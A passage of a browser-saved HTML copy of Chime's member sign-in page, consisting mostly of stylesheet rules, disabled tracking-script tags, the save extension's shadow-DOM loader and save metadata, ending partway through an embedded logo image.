            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield.disabled {
                cursor: not-allowed;
                background-color: #eeeeee;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield.disabled .token-input {
                cursor: not-allowed;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield.disabled .token:hover {
                cursor: not-allowed;
                border-color: #d9d9d9;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield.disabled .token:hover .close {
                cursor: not-allowed;
                opacity: 0.2;
                filter: alpha(opacity=20);
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .has-warning .tokenfield.focus {
                border-color: #66512c;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #c0a16b;
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #c0a16b;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .has-error .tokenfield.focus {
                border-color: #843534;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #ce8483;
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #ce8483;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .has-success .tokenfield.focus {
                border-color: #2b542c;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #67b168;
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #67b168;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield.input-sm,
            .transactions-page #transaction-details-view #transaction-details .notes-panel .input-group-sm .tokenfield {
                min-height: 30px;
                padding-bottom: 0px;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .input-group-sm .token,
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield.input-sm .token {
                height: 20px;
                margin-bottom: 4px;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .input-group-sm .token-input,
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield.input-sm .token-input {
                height: 18px;
                margin-bottom: 5px;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield.input-lg,
            .transactions-page #transaction-details-view #transaction-details .notes-panel .input-group-lg .tokenfield {
                height: auto;
                min-height: 45px;
                padding-bottom: 4px;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .input-group-lg .token,
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield.input-lg .token {
                height: 25px;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .input-group-lg .token-label,
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield.input-lg .token-label {
                line-height: 23px;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .input-group-lg .token .close,
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield.input-lg .token .close {
                line-height: 1.3em;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .input-group-lg .token-input,
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield.input-lg .token-input {
                height: 23px;
                line-height: 23px;
                margin-bottom: 6px;
                vertical-align: top;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield.rtl {
                direction: rtl;
                text-align: right;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield.rtl .token {
                margin: -1px 0 5px 5px;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield.rtl .token .token-label {
                padding-left: 0px;
                padding-right: 4px;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .token-input {
                font-size: 14px;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield {
                margin: 10px 0;
                -webkit-box-shadow: none;
                box-shadow: none;
                min-height: 90px;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .tokenfield::before {
                color: #666666;
                display: inline-block;
                font-size: 12px;
                margin-right: 5px;
            }
            .transactions-page #transaction-details-view #transaction-details .notes-panel .label-primary {
                text-transform: none;
            }
            .transactions-page #transaction-details-view #transaction-details #update-status {
                height: 36px;
                line-height: 34px;
                padding: 0 0 0 5px;
            }
            .transactions-page #transaction-details-view #transaction-details #update-status.success {
                color: #1ec677;
            }
            .transactions-page #transaction-details-view #transaction-details #update-status .iconify {
                font-size: 34px;
                line-height: 34px;
            }
            .transactions-page #transaction-details-view #transaction-details .transaction-detail-overlay {
                display: block;
                background: rgba(0, 0, 0, 0.6);
                height: 100%;
                width: 100%;
                position: absolute;
                z-index: 1001;
                top: 0;
                left: 0;
                -webkit-border-radius: 5px;
                -moz-border-radius: 5px;
                -ms-border-radius: 5px;
                -o-border-radius: 5px;
                border-radius: 5px;
            }
            .transactions-page #transaction-details-view #transaction-details .transaction-detail-overlay #close-txn-detail-overlay {
                border: 1px solid #fff;
                -webkit-border-radius: 15px;
                -moz-border-radius: 15px;
                -ms-border-radius: 15px;
                -o-border-radius: 15px;
                border-radius: 15px;
                height: 30px;
                width: 30px;
                color: #fff;
                background: transparent;
                position: absolute;
                right: 10px;
                top: 10px;
                z-index: 2;
            }
            .transactions-page #transaction-details-view #transaction-details .transaction-detail-overlay h3 {
                color: #fff;
            }
            .transactions-page #transaction-details-view #transaction-details .transaction-detail-overlay #select-category-dropdown li {
                cursor: pointer;
                padding: 7px 5px;
                border-bottom: 1px solid rgba(102, 102, 102, 0.2);
            }
            .transactions-page #transaction-details-view #transaction-details .transaction-detail-overlay #select-category-dropdown li:hover {
                background: rgba(102, 102, 102, 0.1);
            }
            .transactions-page #transaction-details-view #transaction-details .transaction-detail-overlay #select-category-dropdown li:last-child {
                border-bottom: none;
            }
            .transactions-page #transaction-details-view #transaction-details .transaction-detail-overlay #select-category-dropdown .sub-category-list {
                max-height: 163px;
                overflow-y: auto;
                border-bottom: 1px solid rgba(102, 102, 102, 0.2);
            }
            .transactions-page #transaction-details-view #transaction-details .transaction-detail-overlay #select-category-dropdown .sub-category-list li {
                background: rgba(102, 102, 102, 0.05);
                padding: 5px 5px 5px 48px;
                border-bottom: none;
            }
            .transactions-page #transaction-details-view #transaction-details .transaction-detail-overlay #select-category-dropdown .sub-category-list li:hover {
                background: rgba(102, 102, 102, 0.2);
            }
            .transactions-page #transaction-details-view #transaction-details .transaction-detail-overlay #select-category-dropdown #category-dropdown-btn {
                text-align: left;
            }
            .transactions-page #transaction-details-view #transaction-details .transaction-detail-overlay #select-category-dropdown .downarrow {
                position: absolute;
                right: 10px;
                margin: 0;
                font-size: 20px;
                line-height: 30px;
            }
            .transactions-page #transaction-details-view #transaction-details .transaction-detail-overlay #select-category-dropdown .category-icon {
                font-size: 26px;
                line-height: 26px;
                padding: 0 12px 0 5px;
            }
            .transactions-page #transaction-details-view #transaction-details .transaction-detail-overlay .form-control {
                border: 0;
            }
            .transactions-page #transaction-details-view #transaction-details .transaction-detail-overlay .tt-hint {
                padding-left: 17px;
            }
            .transactions-page #transaction-details-view.alternate-style {
                background: rgba(255, 255, 255, 0.7);
                height: 85.1%;
                width: 100%;
                padding-top: 15px;
            }
            .transactions-page #transaction-details-view.alternate-style #transaction-details {
                margin: 0 auto;
            }
            @media (min-width: 768px) {
                .transactions-page #transaction-details-view.alternate-style #transaction-details {
                    width: 70%;
                }
            }
            @media (min-width: 992px) {
                .transactions-page #transaction-details-view.alternate-style #transaction-details {
                    width: 60%;
                }
            }
            @media (min-width: 1200px) {
                .transactions-page #transaction-details-view.alternate-style #transaction-details {
                    width: 50%;
                }
            }
            .transactions-page .loading-txns-indicator {
                height: 64px;
                width: 100%;
                position: relative;
            }
            .transactions-page .loading-txns-indicator:before {
                top: 25%;
            }
            .transactions-page .no-results {
                border-bottom: 1px solid #eaeaea;
                color: #666666;
                padding: 15px;
            }
            .transactions-page .tip-icon {
                font-size: 48px;
                color: rgba(102, 102, 102, 0.5);
            }
            .transactions-page .show-more-bar {
                padding: 15px;
            }
            #payback {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100%;
                flex-direction: column;
                text-align: center;
                margin: 0 auto;
                padding: 0 12%;
            }
            #payback a.venmo {
                background: #5595c7;
                color: white;
                margin-bottom: 25%;
            }
            #payback a.chime {
                background: #2dc57a;
                color: white;
            }
            #payback .cta {
                color: #666;
                padding: 12px 25px;
                border-radius: 20px;
                font-family: "Source Sans Pro Bold", sans-serif;
                font-size: 12px;
                letter-spacing: 1.6px;
                font-weight: 600;
            }
            #payback h4,
            #payback p,
            #payback a {
                display: block;
            }
            #payback h4,
            #payback a {
                margin: 15px;
            }
            #payback h4 {
                font-weight: 600;
            }
            #payback #grin {
                width: 35px;
                height: auto;
                margin: 0 auto;
            }
            .partner-banks {
                margin-top: 12px;
            }
            .partner-banks .partner-banks-text {
                color: #333333;
                font-size: 16px;
                line-height: 22px;
            }
            .partner-banks a {
                color: #1ec677;
                display: inline;
            }
            #header_logo {
                display: block;
                margin: 8px auto;
            }
            .pay-friends {
                font-weight: normal;
                color: #333333;
            }
            @media screen and (max-width: 767px) {
                .pay-friends {
                    margin: 0 22px;
                }
            }
            .pay-friends h3 {
                font-family: "Source Sans Pro", sans-serif;
                font-size: 18px;
                font-weight: 600;
                line-height: 1.3;
                margin-top: 0;
                margin-bottom: 34px;
                color: #333333;
            }
            .pay-friends img {
                display: inline-block;
            }
            .pay-friends sup {
                font-size: 65%;
                left: 1px;
                margin-right: 1px;
            }
            .pay-friends ul {
                padding-left: 20px;
                padding-top: 4px;
            }
            .pay-friends ul li {
                padding: 0 0 4px 0;
                line-height: 18px;
            }
            .pay-friends ul li span {
                font-size: 14px;
            }
            @media screen and (min-width: 768px) {
                .pay-friends ul {
                    padding-top: 2px;
                }
                .pay-friends ul li {
                    padding: 0 0 4px 3px;
                    line-height: 20px;
                    letter-spacing: 0.05px;
                }
                .pay-friends ul li span {
                    font-size: 16px;
                }
            }
            .pay-friends .logo-wrapper {
                margin-bottom: 20px;
                text-align: center;
            }
            @media screen and (min-width: 768px) {
                .pay-friends .logo-wrapper {
                    padding-top: 20px;
                }
            }
            .pay-friends .btn-success {
                background: linear-gradient(180deg, #5fe4a5 0%, #1ec677 100%);
                border: 0px;
                height: 40px;
                font-size: 16px;
                letter-spacing: 0.7px;
                max-width: 300px;
                display: block;
                margin: 0 auto 10px;
            }
            @media screen and (min-width: 768px) {
                .pay-friends .btn-success {
                    max-width: 400px;
                    height: 53px;
                    margin-bottom: 16px;
                    line-height: 37px;
                    letter-spacing: 0.9px;
                }
            }
            .pay-friends .copy {
                line-height: 1.5;
                font-size: 14px;
                font-weight: 400;
            }
            .pay-friends .sign-in-link {
                display: inline-block;
                color: #1ec677;
                letter-spacing: 0.44px;
                font-weight: 600;
                font-size: 14px;
            }
            @media screen and (min-width: 768px) {
                .pay-friends .sign-in-link {
                    letter-spacing: 0.5px;
                }
            }
            .pay-friends #content-container {
                padding-bottom: 0px;
            }
            .pay-friends #expired-message-section {
                margin: -1px auto 30px;
                max-width: 445px;
                text-align: center;
            }
            .pay-friends #expired-message-section .warning-icon {
                width: 52px;
                margin-bottom: 24px;
            }
            .pay-friends #expired-message-section .headline {
                font-size: 18px;
                font-weight: normal;
                margin-bottom: 13px;
            }
            .pay-friends #expired-message-section p {
                font-size: 14px;
                line-height: 18px;
                letter-spacing: 0px;
                margin-bottom: 19px;
            }
            @media screen and (min-width: 768px) {
                .pay-friends #expired-message-section {
                    margin-top: 16px;
                }
                .pay-friends #expired-message-section .warning-icon {
                    width: 49px;
                    margin-bottom: 21px;
                }
                .pay-friends #expired-message-section .headline {
                    font-size: 30px;
                    line-height: 38px;
                    letter-spacing: 0.3px;
                    margin-bottom: 18px;
                }
                .pay-friends #expired-message-section p {
                    font-size: 16px;
                    line-height: 20px;
                }
            }
            .pay-friends #payment-info-section {
                margin-bottom: 28px;
                margin-top: 6px;
            }
            .pay-friends #payment-info-section .headline {
                font-size: 20px;
            }
            @media screen and (min-width: 768px) {
                .pay-friends #payment-info-section .headline {
                    font-size: 30px;
                    margin-bottom: 23px;
                }
            }
            .pay-friends #payment-info-section .payment {
                font-size: 28px;
                margin-bottom: 18px;
            }
            @media screen and (min-width: 768px) {
                .pay-friends #payment-info-section .payment {
                    font-size: 42px;
                    margin-bottom: 23px;
                }
            }
            .pay-friends #payment-info-section .payment .integer {
                font-size: 70px;
                line-height: 63px;
                font-weight: 300;
                vertical-align: top;
                margin-left: -4px;
                margin-right: -4px;
            }
            @media screen and (min-width: 768px) {
                .pay-friends #payment-info-section .payment .integer {
                    font-size: 90px;
                    line-height: 83px;
                }
            }
            .pay-friends #payment-info-section .memo {
                font-size: 16px;
            }
            @media screen and (min-width: 768px) {
                .pay-friends #payment-info-section .memo {
                    font-size: 30px;
                }
            }
            .pay-friends #cta-section {
                margin-bottom: 40px;
            }
            @media screen and (max-width: 320px) {
                .pay-friends #cta-section {
                    margin-bottom: 16px;
                }
            }
            @media screen and (min-width: 768px) {
                .pay-friends #cta-section {
                    margin-bottom: 16px;
                }
            }
            @media screen and (min-width: 768px) {
                .pay-friends #expired-message-section + #cta-section {
                    margin-bottom: 35px;
                }
            }
            .pay-friends #info-container {
                background-color: #edfaf4;
                padding: 25px 20px 4px;
                margin-left: auto;
                margin-right: auto;
                font-size: 14px;
                line-height: 18px;
            }
            @media screen and (min-width: 768px) {
                .pay-friends #info-container {
                    font-size: 16px;
                    line-height: 20px;
                    padding: 36px 40px 30px;
                }
            }
            .pay-friends #info-container h3 {
                font-size: 18px;
                line-height: 23px;
            }
            @media screen and (max-width: 767px) {
                .pay-friends #info-container h3 {
                    margin-bottom: 12px;
                }
            }
            @media screen and (min-width: 768px) {
                .pay-friends #info-container h3 {
                    font-size: 22px;
                    letter-spacing: 0;
                }
            }
            .pay-friends #info-container .text-section p {
                letter-spacing: 0.1px;
            }
            @media screen and (min-width: 768px) {
                .pay-friends #info-container .text-section {
                    width: 50%;
                    display: inline-block;
                    padding-top: 8px;
                }
                .pay-friends #info-container .text-section p {
                    margin-bottom: 15px;
                    letter-spacing: 0.1px;
                }
            }
            .pay-friends #image-section {
                position: relative;
                margin-top: 16px;
                margin-bottom: 30px;
            }
            .pay-friends #image-section .hide-bottom {
                position: relative;
                width: 50%;
                padding-bottom: 36%;
                overflow: hidden;
            }
            .pay-friends #image-section .hide-bottom img {
                position: absolute;
                top: 0;
                left: 0;
            }
            .pay-friends #image-section img:nth-child(2) {
                width: 55%;
                position: absolute;
                top: 11px;
                right: 0;
            }
            @media screen and (min-width: 768px) {
                .pay-friends #image-section {
                    margin-top: 0;
                    float: right;
                    width: 45%;
                    right: -8px;
                    margin-bottom: 40px;
                }
                .pay-friends #image-section .hide-bottom {
                    padding-bottom: 82%;
                }
                .pay-friends #image-section img:nth-child(2) {
                    top: auto;
                    bottom: 0;
                }
            }
            .pay-friends #fine-print-container {
                padding: 32px 0;
                font-size: 9px;
                line-height: 11px;
                color: #4a4a4a;
            }
            @media screen and (min-width: 768px) {
                .pay-friends #fine-print-container {
                    padding: 39px 0;
                    letter-spacing: 0;
                }
            }
            .pay-friends #content-wrapper {
                max-width: 715px;
                width: 100%;
                margin-left: auto;
                margin-right: auto;
            }
            @media screen and (max-width: 991px) {
                .hide_on_mobile {
                    display: none;
                }
                .center_on_mobile {
                    text-align: center;
                }
            }
            @media screen and (min-width: 768px) {
                .show_on_mobile {
                    display: none;
                }
            }
            .list-with-circles {
                list-style-type: circle;
                font-size: 19px;
            }
            #identity-verfication-confirmation {
                position: relative;
                background: #fff;
                padding: 15px;
            }
            #identity-verfication-confirmation .info-section .img-responsive {
                margin-top: 8px;
            }
            #identity-verfication-confirmation .info-section p {
                text-align: center;
                color: #333;
                font-size: 16px;
                line-height: 22px;
                font-weight: 450;
            }
            #identity-verfication-confirmation .info-section h4 {
                text-align: center;
                margin-top: 31.68px;
                font-size: 21px;
                color: #333;
                font-weight: 700;
            }
            @media (min-width: 768px) {
                .sweepstakes-entry {
                    background: #fafafa;
                }
            }
            .sweepstakes-entry .focus-container {
                background: white;
                padding: 48px;
                margin-bottom: 40px;
            }
            @media (min-width: 768px) {
                .sweepstakes-entry .focus-container {
                    box-shadow: 0px 8px 12px rgba(0, 0, 0, 0.2);
                    margin-top: 45px;
                    border-radius: 24px;
                }
            }
            .sweepstakes-entry h1 {
                font-size: 28px;
            }
            .sweepstakes-entry .terms {
                margin-bottom: 16px;
            }
            .sweepstakes-entry input[type="text"],
            .sweepstakes-entry input[type="email"],
            .sweepstakes-entry input[type="tel"] {
                background: #ffffff;
                border: 2px solid #eceff1;
                border-radius: 8px;
                margin-bottom: 16px;
            }
            .sweepstakes-entry .name-inputs {
                display: flex;
            }
            .sweepstakes-entry .name-inputs .name-input {
                width: 50%;
            }
            .sweepstakes-entry .name-inputs .name-input.first {
                margin-right: 5px;
            }
            .sweepstakes-entry .name-inputs .name-input.last {
                margin-left: 5px;
            }
            .sweepstakes-entry .certifications {
                display: flex;
                margin-bottom: 16px;
                word-break: break-word;
            }
            .sweepstakes-entry .checkbox {
                margin-right: 18px;
            }
            .sweepstakes-entry input[type="checkbox"] {
                position: relative;
                margin: 0;
                width: 20px;
                height: 20px;
                accent-color: #2de38e;
            }
            .sweepstakes-entry input[type="submit"] {
                background-color: #2de38e;
                border-color: #2de38e;
                color: #333333;
                border-radius: 24px;
                font-size: 16;
                color: "#333";
            }
            .sweepstakes-entry .success-image {
                margin: 50px 0;
                text-align: center;
            }
            .sweepstakes-entry .success-image img {
                width: 100%;
                max-width: 250px;
            }
            .sweepstakes-entry .success-heading {
                text-align: center;
            }
            .sweepstakes-page #content-container {
                overflow: hidden;
            }
            .auth-panel .btn-call {
                background-color: transparent;
                color: #1ec677;
            }
            .auth-panel #terms {
                font-size: 14px;
                color: #74758c;
            }
            .auth-panel #terms a {
                color: #1ec677;
            }
            .auth-panel .update_number_link {
                color: #1ec677;
            }
        </style>
        <script data-savepage-type="" type="text/plain" data-savepage-src="/assets/core_libs-c9cce45a4d0c9cec6be50b05994f29b6bdfdf1087713ac559a0fb7d1e8856d9c.js"></script>
        <style>
            .r34K7X1zGgAi6DllVF3T {
                box-sizing: border-box;
                border: 0;
                margin: 0;
                padding: 0;
                overflow: hidden;
                display: none;
                z-index: 2147483647;
                pointer-events: none;
                visibility: hidden;
                opacity: 0;
                transition: opacity 300ms linear;
                height: 0;
                width: 0;
            }
            .r34K7X1zGgAi6DllVF3T.active {
                display: block;
                visibility: visible;
            }
            .r34K7X1zGgAi6DllVF3T.active.show {
                opacity: 1;
                pointer-events: inherit;
                position: inherit;
            }
            .r34K7X1zGgAi6DllVF3T.active.show.in-situ {
                width: inherit;
                height: inherit;
            }
            .r34K7X1zGgAi6DllVF3T.active.show.lightbox {
                position: fixed;
                width: 100% !important;
                height: 100% !important;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
            }
            @-moz-document url-prefix('') {
                .r34K7X1zGgAi6DllVF3T {
                    visibility: visible;
                    display: block;
                }
            }
        </style>

        <meta
            http-equiv="origin-trial"
            content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"
        />
        <meta
            http-equiv="origin-trial"
            content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"
        />
        <meta
            http-equiv="origin-trial"
            content="A+xK4jmZTgh1KBVry/UZKUE3h6Dr9HPPioFS4KNCzify+KEoOii7z/goKS2zgbAOwhpZ1GZllpdz7XviivJM9gcAAACFeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiQXR0cmlidXRpb25SZXBvcnRpbmdDcm9zc0FwcFdlYiIsImV4cGlyeSI6MTcwNzI2Mzk5OSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="
        />
        <script data-savepage-type="" type="text/plain" data-savepage-src="https://www.knotch-cdn.com/ktag/latest/ktag.min.js?accountId=89554c98-4105-4354-b139-77e62701743b" async=""></script>
        <script data-savepage-type="" type="text/plain" data-savepage-src="https://d2hrivdxn8ekm8.cloudfront.net/tracker-latest.min.js" async=""></script>
        <script data-savepage-src="https://bat.bing.com/p/action/5819072.js" data-savepage-type="text/javascript" type="text/plain" async="" data-ueto="ueto_10822a0408"></script>
        <script data-savepage-type="" type="text/plain" charset="utf-8" data-savepage-src="https://analytics.tiktok.com/i18n/pixel/static/identify_2ff01.js"></script>
        <style id="savepage-cssvariables">
            :root {
            }
        </style>
        <script id="savepage-shadowloader" type="text/javascript">
            "use strict";
            window.addEventListener(
                "DOMContentLoaded",
                function (event) {
                    savepage_ShadowLoader(5);
                },
                false
            );
            function savepage_ShadowLoader(c) {
                createShadowDOMs(0, document.documentElement);
                function createShadowDOMs(a, b) {
                    var i;
                    if (b.localName == "iframe" || b.localName == "frame") {
                        if (a < c) {
                            try {
                                if (b.contentDocument.documentElement != null) {
                                    createShadowDOMs(a + 1, b.contentDocument.documentElement);
                                }
                            } catch (e) {}
                        }
                    } else {
                        if (b.children.length >= 1 && b.children[0].localName == "template" && b.children[0].hasAttribute("data-savepage-shadowroot")) {
                            b.attachShadow({ mode: "open" }).appendChild(b.children[0].content);
                            b.removeChild(b.children[0]);
                            for (i = 0; i < b.shadowRoot.children.length; i++) if (b.shadowRoot.children[i] != null) createShadowDOMs(a, b.shadowRoot.children[i]);
                        }
                        for (i = 0; i < b.children.length; i++) if (b.children[i] != null) createShadowDOMs(a, b.children[i]);
                    }
                }
            }
        </script>
        <meta name="savepage-url" content="https://member.chime.com/users/sign_in" />
        <meta name="savepage-title" content="Member Login" />
        <meta name="savepage-pubdate" content="Unknown" />
        <meta name="savepage-from" content="https://member.chime.com/users/sign_in" />
        <meta name="savepage-date" content="Thu Aug 24 2023 12:50:36 GMT+0100 (British Summer Time)" />
        <meta
            name="savepage-state"
            content="Standard Items; Retain cross-origin frames; Merge CSS images; Remove unsaved URLs; Load lazy images in existing content; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;"
        />
        <meta name="savepage-version" content="33.9" />
        <meta name="savepage-comments" content="" />
    </head>
    <body
        id="application"
        class="animated fadeIn"
        bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjEuOS4xMiIsInNjb3JlIjoxMDkxMjB9XQ=="
    >
        <script data-savepage-src="//static.tapfiliate.com/tapfiliate.js" data-savepage-type="text/javascript" type="text/plain" async=""></script>
        <script data-savepage-type="text/javascript" type="text/plain"></script>

        <!-- Google Tag Manager (noscript) -->
        <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N3Z9ZNR" height="0" width="0" style="display: none; visibility: hidden;"></iframe></noscript>
        <!-- End Google Tag Manager (noscript) -->

        <div id="ajax-loading-screen" class="hide" bis_skin_checked="1"></div>
        <div id="content-container" class="simple" bis_skin_checked="1">
            <div id="header" class="simple" bis_skin_checked="1">
                <div class="logo-wrapper" bis_skin_checked="1">
                    <a href="https://www.chime.com/?_gl=1*1ugd16d*_ga*MTUzMjMxOTQ3Ni4xNjkyODc3NzQw*_ga_9G6X89ETJB*MTY5Mjg3Nzc0NS4xLjAuMTY5Mjg3Nzc0NS42MC4wLjA.">
                        <img
                            class="image-responsive center"
                            style="width: 155px;"
                            data-savepage-currentsrc="https://member.chime.com/assets/site/logo-with-text-124c50da21b53d3291ec1dd062abe8e44517308254e6078b09f924b5b6967030.png"
                            data-savepage-src="/assets/site/logo-with-text-124c50da21b53d3291ec1dd062abe8e44517308254e6078b09f924b5b6967030.png"
                            src="data:image/png;base64,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